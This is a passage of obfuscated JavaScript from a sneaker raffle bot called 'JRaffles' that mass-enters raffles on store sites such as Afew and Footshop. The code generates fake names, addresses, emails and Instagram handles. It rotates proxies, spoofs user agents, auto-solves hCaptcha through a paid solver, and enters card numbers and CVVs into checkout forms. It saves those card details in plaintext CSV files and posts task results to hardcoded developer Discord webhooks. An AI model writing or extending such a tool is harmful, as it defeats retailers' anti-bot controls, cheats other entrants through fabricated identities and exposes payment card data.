                                })['setThumbnail'](_0x34fa3d['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0xf76913,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x34fa3d['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x2cde8d['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x582dcf,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x25db62['data'];
                            } else {
                                if (_0x1a8941 && _0x193dcd == 'ver') {
                                    var _0x25db62 = new _0x58ddf4()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x34fa3d['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0xf76913,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x24e11e,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x34fa3d['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x2cde8d['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x582dcf,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x25db62['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x43304e(_0x58ba44, _0x35f8cc) {
    var _0x2287c0 = _0x58ba44[_0x35f8cc]['Address1']['split'](''), _0x423050 = _0x58ba44[_0x35f8cc]['Address2']['split'](''), _0x1d76d1 = _0x58ba44[_0x35f8cc]['Email']['split']('@');
    for (var _0x1bd1f0 = 0x0; _0x1bd1f0 < _0x2287c0['length']; _0x1bd1f0++) {
        if (_0x2287c0[_0x1bd1f0] == 'X') {
            var _0x769c9c = Math['round'](Math['random']() * (_0x2e480f['length'] - 0x1));
            _0x2287c0[_0x1bd1f0] = _0x2a9c50[_0x769c9c];
        }
    }
    ;
    for (var _0x1bd1f0 = 0x0; _0x1bd1f0 < _0x423050['length']; _0x1bd1f0++) {
        if (_0x423050[_0x1bd1f0] == 'X') {
            var _0x769c9c = Math['round'](Math['random']() * (_0x2e480f['length'] - 0x1));
            _0x423050[_0x1bd1f0] = _0x2a9c50[_0x769c9c];
        }
    }
    ;
    _0x58ba44[_0x35f8cc]['FirstName'] == 'RANDOM' && (_0x58ba44[_0x35f8cc]['FirstName'] = _0x171eca['first']());
    _0x58ba44[_0x35f8cc]['LastName'] == 'RANDOM' && (_0x58ba44[_0x35f8cc]['LastName'] = _0x171eca['last']());
    _0x1d76d1[0x0] == 'RANDOM' ? _0x1d76d1[0x0] = '' + _0x171eca['first']() + _0x171eca['last']() + '@' : _0x1d76d1[0x0] = _0x1d76d1[0x0] + '@';
    _0x58ba44[_0x35f8cc]['Email'] = _0x1d76d1['join'](''), _0x58ba44[_0x35f8cc]['Address1'] = _0x2287c0['join'](''), _0x58ba44[_0x35f8cc]['Address2'] = _0x423050['join']('');
    _0x58ba44[_0x35f8cc]['Phone'] == 'RANDOM' && (_0x58ba44[_0x35f8cc]['Phone'] = '0' + _0x368412(0x5f5e100, 0x3b9ac9ff));
    if (_0x58ba44[_0x35f8cc]['Follower'] == 'RANDOM') {
        var _0x1f62d3 = _0x368412(0x1, 0x270f);
        _0x58ba44[_0x35f8cc]['Follower'] = '' + _0x171eca['first']() + _0x171eca['last']() + _0x1f62d3 + '\x20';
    }
    _0x58ba44[_0x35f8cc]['HouseNumber'] == 'RANDOM' && (_0x58ba44[_0x35f8cc]['HouseNumber'] = _0x368412(0x1, 0xc8));
    if (_0x58ba44[_0x35f8cc]['Address1'] == 'RANDOM') {
        var _0x15ebed = Math['round'](Math['random']() * (_0x2e480f['length'] - 0x1)), _0xb905a5 = _0x2a9c50[_0x15ebed];
        _0x58ba44[_0x35f8cc]['Address1'] = _0x171eca['last']() + 'straat', _0x58ba44[_0x35f8cc]['Zip'] == '' && (_0x58ba44[_0x35f8cc]['Postcode'] = _0x368412(0x3e8, 0x270f) + '\x20' + _0xb905a5 + _0xb905a5, _0x58ba44[_0x35f8cc]['Zip'] = _0x58ba44[_0x35f8cc]['Postcode']), _0x58ba44[_0x35f8cc]['HouseNumber'] = '' + _0x368412(0x1, 0xc8);
    }
    return;
}
;
async function _0x29520a(_0x137e91, _0x5f503a) {
    _0x45be1e['appendFileSync']('../failed-tasks.csv', _0x2ec97e() + ',' + _0x5f503a['store'] + ',' + _0x5f503a['name'] + ',' + _0x137e91['Url'] + ',' + _0x137e91['Size'] + ',' + _0x137e91['Follower'] + ',' + _0x137e91['FirstName'] + ',' + _0x137e91['LastName'] + ',' + _0x137e91['Address1'] + ',' + _0x137e91['Address2'] + ',' + _0x137e91['HouseNumber'] + ',' + _0x137e91['Zip'] + ',' + _0x137e91['City'] + ',' + _0x137e91['State'] + ',' + _0x137e91['Country'] + ',' + _0x137e91['Phone'] + ',' + _0x137e91['Email'] + ',' + _0x137e91['Password'] + ',' + _0x137e91['PaymentMethod'] + ',' + _0x137e91['CardType'] + ',' + _0x137e91['NameOnCard'] + ',' + _0x137e91['CardNumber'] + ',' + _0x137e91['ExpiryDate'] + ',' + _0x137e91['CVV'] + ',' + _0x137e91['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x4cb72b(_0x55d998, _0x56baf9) {
    _0x45be1e['appendFileSync']('../successful-tasks.csv', _0x2ec97e() + ',' + _0x56baf9['store'] + ',' + _0x56baf9['name'] + ',' + _0x55d998['Url'] + ',' + _0x55d998['Size'] + ',' + _0x55d998['Follower'] + ',' + _0x55d998['FirstName'] + ',' + _0x55d998['LastName'] + ',' + _0x55d998['Address1'] + ',' + _0x55d998['Address2'] + ',' + _0x55d998['HouseNumber'] + ',' + _0x55d998['Zip'] + ',' + _0x55d998['City'] + ',' + _0x55d998['State'] + ',' + _0x55d998['Country'] + ',' + _0x55d998['Phone'] + ',' + _0x55d998['Email'] + ',' + _0x55d998['Password'] + ',' + _0x55d998['PaymentMethod'] + ',' + _0x55d998['CardType'] + ',' + _0x55d998['NameOnCard'] + ',' + _0x55d998['CardNumber'] + ',' + _0x55d998['ExpiryDate'] + ',' + _0x55d998['CVV'] + ',' + _0x55d998['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x3e167a() {
    let _0x361202 = proxyFile['split']('\x0a'), _0x1c01e3 = _0x361202['map']((_0x22e651, _0x59c202) => {
        sanatizeProxy = _0x22e651['replace']('\x0d', '');
        if (_0x361202[_0x59c202 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1c01e3;
}
;
async function _0x555691(_0x4b4f8f) {
    var _0x411d20 = _0x4b4f8f[0x1]['split'](':');
    const _0x29d5a9 = await _0x149082['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x411d20[0x0] + ':' + _0x411d20[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x573820 = await _0x29d5a9['newPage']();
        await _0x573820['authenticate']({
            'username': '' + _0x411d20[0x2],
            'password': '' + _0x411d20[0x3]
        }), console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x573820['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x573820['setRequestInterception'](!![]), _0x573820['on']('request', _0x246203 => {
            _0x246203['resourceType']() === 'image' || _0x246203['resourceType']() === 'font' || _0x246203['resourceType']() === 'media' ? _0x246203['abort']() : _0x246203['continue']();
        }), await _0x573820['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x573820['waitForTimeout'](0xbb8), await _0x573820['waitForSelector']('.product-card');
        const _0x220ce4 = await _0x573820['$$eval']('a.product-card', _0x206cbb => {
            return _0x206cbb['map'](_0x1792ae => _0x1792ae['href']);
        });
        return _0xa9c228 = _0x220ce4;
    } catch (_0xa026ce) {
        console['log']('\x20' + _0xa026ce);
    } finally {
        _0x29d5a9['close'](), console['clear']();
    }
}
;
async function _0x5e14e2(_0x6b9c4d, _0x3969e2, _0x5bf3b2, _0x42464e, _0x37a9c2) {
    _0x3969e2 != 'ver' && await _0x43304e(_0x42464e, _0x6b9c4d);
    if (_0x2cde8d['useRandomProxy'] = ![])
        var _0x26a65d = _0x37a9c2[_0x6b9c4d]['split'](':');
    else
        var _0x100266 = Math['round'](Math['random']() * (_0x37a9c2['length'] - 0x1)), _0x26a65d = _0x37a9c2[_0x100266]['split'](':');
    var _0x5d12ec = _0x5bf3b2['data'];
    _0x3969e2 != 'ver' && (_0x5d12ec['data']['attributes']['properties']['$first_name'] = '' + _0x42464e[_0x6b9c4d]['FirstName'], _0x5d12ec['data']['attributes']['properties']['$last_name'] = '' + _0x42464e[_0x6b9c4d]['LastName'], _0x5d12ec['data']['attributes']['properties']['$address1'] = _0x42464e[_0x6b9c4d]['Address1'] + '\x20' + _0x42464e[_0x6b9c4d]['HouseNumber'] + '\x20' + _0x42464e[_0x6b9c4d]['Address2'], _0x5d12ec['data']['attributes']['properties']['$zip'] = '' + _0x42464e[_0x6b9c4d]['Zip'], _0x5d12ec['data']['attributes']['properties']['$city'] = '' + _0x42464e[_0x6b9c4d]['City'], _0x5d12ec['data']['attributes']['properties']['$country'] = '' + _0x42464e[_0x6b9c4d]['Country'], _0x5d12ec['data']['attributes']['properties']['Size'] = '' + _0x42464e[_0x6b9c4d]['Size'], _0x5d12ec['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x42464e[_0x6b9c4d]['Follower'], _0x3969e2 == 'exp' ? _0x5d12ec['data']['attributes']['email'] = '' + _0x42464e[_0x6b9c4d]['FirstName'] + _0x42464e[_0x6b9c4d]['LastName'] + _0x2cde8d['catchall'] : _0x5d12ec['data']['attributes']['email'] = '' + _0x42464e[_0x6b9c4d]['Email']);
    var _0x289255 = {
        'jar': _0x3c0aa5,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x5bf3b2['url'],
        'headers': _0x5bf3b2['headers'],
        'body': JSON['stringify'](_0x5d12ec),
        'proxy': 'http://' + _0x26a65d[0x2] + ':' + _0x26a65d[0x3] + '@' + _0x26a65d[0x0] + ':' + _0x26a65d[0x1]
    };
    return _0x3969e2 === 'ver' && (_0x289255['method'] = 'GET'), new Promise(function (_0x38a225, _0x10fd92) {
        callback = async (_0x290643, _0x10ecf4, _0x37d2ca) => {
            if (!_0x290643 && _0x10ecf4['statusCode'] == 0xca || !_0x290643 && _0x10ecf4['statusCode'] == 0xc8) {
                _0x38a225(console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x5bf3b2['name'] + ']\x20Task\x20' + (_0x6b9c4d + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x3969e2 != 'ver') {
                    _0x4cb72b(_0x42464e[_0x6b9c4d], _0x5bf3b2);
                    var _0x1b0b22 = await _0x2463d6(_0x42464e[_0x6b9c4d], _0x5bf3b2, 'dev', ![]), _0x29cbac = await _0x2463d6(_0x42464e[_0x6b9c4d], _0x5bf3b2, 'pub', ![]);
                    const _0x4a7798 = {
                        'succesDEVMSG': { 'embeds': [_0x1b0b22] },
                        'succesPUBMSG': { 'embeds': [_0x29cbac] }
                    };
                    if (_0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '')
                        try {
                            await _0x31fc49(_0x2cde8d['webhook'], _0x4a7798['succesDEVMSG']);
                        } catch {
                        }
                    await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x4a7798['succesDEVMSG']), await _0x29ac01(0xc8);
                    try {
                        await _0x31fc49(_0x5bae61, _0x4a7798['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x3969e2 == 'ver') {
                        var _0x1b0b22 = await _0x2463d6(null, _0x5bf3b2, 'ver', ![]);
                        const _0x49a52a = {
                            'succesDEVMSG': { 'embeds': [_0x1b0b22] },
                            'succesPUBMSG': { 'embeds': [_0x29cbac] }
                        };
                        await _0x31fc49(_0x4f1207, _0x49a52a['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x3969e2 != 'ver') {
                    var _0x47dfdf = '' + _0x290643, _0xd16c3b = await _0x2463d6(_0x42464e[_0x6b9c4d], _0x5bf3b2, 'dev', !![], _0x47dfdf), _0x2203a8 = {};
                    _0x2203a8['errorDEV'] = { 'embeds': [_0xd16c3b] }, _0x29520a(_0x42464e[_0x6b9c4d], _0x5bf3b2), _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x2203a8['errorDEV']), await _0x31fc49(_0x344612, _0x2203a8['errorDEV']);
                }
                _0x10fd92(console['log'](_0x91a29b() + '\x20[' + _0x5bf3b2['name'] + ']\x20Task\x20' + (_0x6b9c4d + 0x1) + ':\x20' + _0x290643));
            }
        };
        try {
            _0x3969e2 === 'ver' ? console['log'](_0x91a29b() + '\x20[' + _0x5bf3b2['name'] + ']\x20Task\x20' + (_0x6b9c4d + 0x1) + ':\x20Verifying.') : console['log'](_0x91a29b() + '\x20[' + _0x5bf3b2['name'] + ']\x20Task\x20' + (_0x6b9c4d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5d12ec['data']['attributes']['email']), _0x47e84e(_0x289255, callback);
        } catch (_0x3806bf) {
            console['log'](_0x91a29b() + '\x20Task\x20' + (_0x6b9c4d + 0x1) + ':\x20' + _0x3806bf);
        }
    });
}
;
async function _0x342c88(_0x1ba919, _0x38d7c7, _0x1ca674) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5b0ce4 = 0x0; _0x5b0ce4 < _0x1ba919['length']; _0x5b0ce4++) {
        var _0x3b805c;
        if (_0x5755f9 != 'yes')
            var _0x5755f9 = '', _0x3212b5 = 0x0;
        var _0x3a06d1 = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0xf76913
                },
                {
                    'name': 'Product',
                    'value': '' + _0x1ba919[_0x5b0ce4]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x1ba919[_0x5b0ce4]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x582dcf
                }
            ]
        }], _0x11b235 = await _0x2463d6(_0x1ba919[_0x5b0ce4], _0x1ca674, 'dev', ![]), _0x1aa4d8 = await _0x2463d6(_0x1ba919[_0x5b0ce4], _0x1ca674, 'pub', ![]);
        const _0x4d5df2 = {
            'succesDEVMSG': { 'embeds': [_0x11b235] },
            'succesPUBMSG': { 'embeds': [_0x1aa4d8] }
        }, _0x3017b3 = { 'embeds': _0x3a06d1 };
        await _0x43304e(_0x1ba919, _0x5b0ce4);
        if (_0x1ba919[_0x5b0ce4]['Email'] == '' || _0x1ba919[_0x5b0ce4]['FirstName'] == '' || _0x1ba919[_0x5b0ce4]['LastName'] == '' || _0x1ba919[_0x5b0ce4]['Country'] == '' || _0x1ba919[_0x5b0ce4]['Size'] == '' || _0x1ba919[_0x5b0ce4]['Address1'] == '' || _0x1ba919[_0x5b0ce4]['Zip'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x1ba919[_0x5b0ce4]['Email'] == '' || _0x1ba919[_0x5b0ce4]['FirstName'] == '' || _0x1ba919[_0x5b0ce4]['LastName'] == '' || _0x1ba919[_0x5b0ce4]['Country'] == '' || _0x1ba919[_0x5b0ce4]['Size'] == '' || _0x1ba919[_0x5b0ce4]['Address1'] == '' || _0x1ba919[_0x5b0ce4]['Zip'] == '' || _0x1ba919[_0x5b0ce4]['Phone'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x277538 = '' + _0x1ba919[_0x5b0ce4]['Url'];
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x5719b1 = _0x38d7c7[_0x5b0ce4]['split'](':');
        else
            var _0x568036 = Math['round'](Math['random']() * (_0x38d7c7['length'] - 0x1)), _0x5719b1 = _0x38d7c7[_0x568036]['split'](':');
        const _0x21366a = await _0x149082['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x5719b1[0x0] + ':' + _0x5719b1[0x1]]
        });
        try {
            const _0x5c16fb = await _0x21366a['newPage']();
            await _0x5c16fb['authenticate']({
                'username': '' + _0x5719b1[0x2],
                'password': '' + _0x5719b1[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c16fb['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5c16fb['setRequestInterception'](!![]), _0x5c16fb['on']('request', _0x1cb587 => {
                _0x1cb587['resourceType']() === 'image' || _0x1cb587['resourceType']() === 'font' || _0x1cb587['resourceType']() === 'media' ? _0x1cb587['abort']() : _0x1cb587['continue']();
            }), await _0x5c16fb['goto'](_0x277538), await _0x29ac01(0xbb8), await _0x5c16fb['waitForSelector']('.control__JhutY'), await _0x5c16fb['click']('.control__JhutY'), await _0x29ac01(0x1f4);
            if (_0x1ba919[_0x5b0ce4]['Size'] != 'RANDOM')
                try {
                    const _0x635b04 = await _0x5c16fb['$x']('//div[contains(text(),\x20\x27' + _0x1ba919[_0x5b0ce4]['Size'] + '\x27)]');
                    await _0x635b04[0x0]['click']();
                } catch {
                    console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x2f18a9 = await _0x5c16fb['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x3c9ee0 = Math['round'](Math['random']() * (_0x2f18a9['length'] - 0x1));
                await _0x2f18a9[_0x3c9ee0]['click']();
            }
            await _0x29ac01(0x4b0);
            const _0x10a55a = await _0x5c16fb['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x10a55a[0x0]['click'](), await _0x5c16fb['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x5c16fb['type']('input[name=\x22email\x22]', '' + _0x1ba919[_0x5b0ce4]['Email']), await _0x29ac01(0x640), await _0x5c16fb['type']('input[name=\x22phone\x22]', '' + _0x1ba919[_0x5b0ce4]['Phone']), await _0x29ac01(0x4b0), await _0x5c16fb['click']('button.btn.continue-button__1RtsS'), await _0x29ac01(0x4b0);
            try {
                await _0x5c16fb['type']('input[name=\x22firstName\x22]', '' + _0x1ba919[_0x5b0ce4]['FirstName']), await _0x29ac01(0x258);
            } catch {
                const _0x41e5bc = await _0x5c16fb['$$eval']('.invalid-feedback\x20>\x20div', _0x5f5bd4 => {
                    return _0x5f5bd4['map'](_0x6c93c2 => _0x6c93c2['innerText']);
                });
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20' + _0x41e5bc));
                continue;
            }
            await _0x5c16fb['type']('input[name=\x22lastName\x22]', '' + _0x1ba919[_0x5b0ce4]['LastName']), await _0x29ac01(0xc8), await _0x5c16fb['type']('input[name=\x22instagramUsername\x22]', '' + _0x1ba919[_0x5b0ce4]['Follower']), await _0x29ac01(0x4b0), await _0x5c16fb['click']('button.btn.continue-button__1RtsS'), await _0x29ac01(0x3e8), console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x5c16fb['select']('select[name=\x22country\x22]', '' + _0x1ba919[_0x5b0ce4]['Country']), await _0x29ac01(0x2bc), await _0x5c16fb['type']('input[name=\x22streetName\x22]', '' + _0x1ba919[_0x5b0ce4]['Address1']), await _0x29ac01(0x258), await _0x5c16fb['type']('input[name=\x22houseNumber\x22]', _0x1ba919[_0x5b0ce4]['HouseNumber'] + '\x20' + _0x1ba919[_0x5b0ce4]['Address2']), await _0x29ac01(0xc8), await _0x5c16fb['type']('input[name=\x22postalCode\x22]', '' + _0x1ba919[_0x5b0ce4]['Zip']), await _0x29ac01(0x1f4), await _0x5c16fb['type']('input[name=\x22city\x22]', '' + _0x1ba919[_0x5b0ce4]['City']), await _0x29ac01(0x4b0), await _0x5c16fb['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x29ac01(0x4b0), await _0x5c16fb['click']('button.btn.continue-button__1RtsS'), await _0x29ac01(0x4b0), console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x5c16fb['solveRecaptchas'](), console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x29ac01(0xbb8), await _0x5c16fb['click']('button.btn.continue-button__1RtsS'), await _0x29ac01(0x1388), console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5c16fb['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5c16fb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x29ac01(0x4b0), await _0x5c16fb['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x1ba919[_0x5b0ce4]['CardNumber']), await _0x29ac01(0x320), await _0x5c16fb['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5c16fb['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x1ba919[_0x5b0ce4]['ExpiryDate']), await _0x29ac01(0x4b0), await _0x5c16fb['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5c16fb['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x1ba919[_0x5b0ce4]['CVV']), await _0x29ac01(0x226), await _0x5c16fb['type']('input[name=\x22holderName\x22]', '' + _0x1ba919[_0x5b0ce4]['NameOnCard']), await _0x29ac01(0x226), await _0x5c16fb['click']('button.adyen-checkout__button'), console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x5c16fb['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x29ac01(0xbb8);
            } catch (_0x15eb76) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x203DS\x20Failed')), _0x3b805c = '3DS\x20Error\x20' + _0x15eb76;
                var _0xabb1e = await _0x2463d6(_0x1ba919[_0x5b0ce4], _0x1ca674, 'dev', !![], _0x3b805c);
                _0x4d5df2['errorDEV'] = { 'embeds': [_0xabb1e] };
                _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x4d5df2['errorDEV']);
                await _0x31fc49(_0x344612, _0x4d5df2['errorDEV']);
                continue;
            }
            _0x4cb72b(_0x1ba919[_0x5b0ce4], _0x1ca674), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '')
                try {
                    await _0x31fc49(_0x2cde8d['webhook'], _0x4d5df2['succesDEVMSG']);
                } catch {
                }
            await _0x29ac01(0xc8), await _0x31fc49(_0x1bd5ed, _0x4d5df2['succesDEVMSG']), await _0x29ac01(0xc8);
            try {
                await _0x31fc49(_0x5bae61, _0x4d5df2['succesPUBMSG']);
            } catch {
            }
        } catch (_0x29b4d4) {
            console['log'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20' + _0x29b4d4), _0x3b805c = '' + _0x29b4d4;
            var _0xabb1e = await _0x2463d6(_0x1ba919[_0x5b0ce4], _0x1ca674, 'dev', !![], _0x3b805c);
            _0x4d5df2['errorDEV'] = { 'embeds': [_0xabb1e] }, _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x4d5df2['errorDEV']), await _0x31fc49(_0x344612, _0x4d5df2['errorDEV']), _0x5755f9 = 'yes';
        } finally {
            _0x21366a['close']();
            if (_0x5755f9 == 'yes' && _0x3212b5 != 0x5) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x1ca674['name'] + ']\x20Task\x20' + (_0x5b0ce4 + 0x1) + '\x20:\x20Retrying')), _0x5b0ce4 = _0x5b0ce4 - 0x1, _0x3212b5 = _0x3212b5 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x2cde8d['footshopDelay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['footshopDelay']);
        }
    }
}
afewFunction = async (_0x3f24bb, _0x30c63d, _0xa52a35, _0x167aa3, _0x21f4d4) => {
    for (var _0x11e3bb = 0x0; _0x11e3bb < _0x167aa3['length']; _0x11e3bb++) {
        _0x2cde8d['AfewDelay'] = _0x2cde8d['delay'];
        var _0x4af4a4;
        if (_0x2cb418 != 'yes')
            var _0x2cb418 = '', _0x5c9c02 = 0x0;
        _0x167aa3[_0x11e3bb]['Url'] = _0x3f24bb, _0x757e32(_0xa52a35['name'] + '\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20/\x20' + _0x167aa3['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83), await _0x43304e(_0x167aa3, _0x11e3bb);
        var _0x2dd239 = await _0x2463d6(_0x167aa3[_0x11e3bb], _0xa52a35, 'dev', ![]), _0x4a52c6 = await _0x2463d6(_0x167aa3[_0x11e3bb], _0xa52a35, 'pub', ![]);
        const _0x5d6489 = {
            'succesDEVMSG': { 'embeds': [_0x2dd239] },
            'succesPUBMSG': { 'embeds': [_0x4a52c6] }
        };
        if (_0x167aa3[_0x11e3bb]['Email'] == '' || _0x167aa3[_0x11e3bb]['FirstName'] == '' || _0x167aa3[_0x11e3bb]['LastName'] == '' || _0x167aa3[_0x11e3bb]['Country'] == '' || _0x167aa3[_0x11e3bb]['Size'] == '' || _0x167aa3[_0x11e3bb]['Address1'] == '' || _0x167aa3[_0x11e3bb]['Zip'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0xe3454b = _0x21f4d4[_0x11e3bb]['split'](':');
        else
            var _0x1838a3 = Math['round'](Math['random']() * (_0x21f4d4['length'] - 0x1)), _0xe3454b = _0x21f4d4[_0x1838a3]['split'](':');
        const _0x44cb89 = await _0x149082['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0xe3454b[0x0] + ':' + _0xe3454b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1842f7 = await _0x44cb89['newPage']();
            await _0x1842f7['setDefaultNavigationTimeout'](0x1d4c0), await _0x1842f7['authenticate']({
                'username': '' + _0xe3454b[0x2],
                'password': '' + _0xe3454b[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0xa52a35['name'] + ']\x20Task\x20' + (_0x11e3bb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1842f7['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1842f7['setRequestInterception'](!![]), _0x1842f7['on']('request', _0xc73cb0 => {
                _0xc73cb0['resourceType']() === 'image' || _0xc73cb0['resourceType']() === 'font' || _0xc73cb0['resourceType']() === 'media' ? _0xc73cb0['abort']() : _0xc73cb0['continue']();
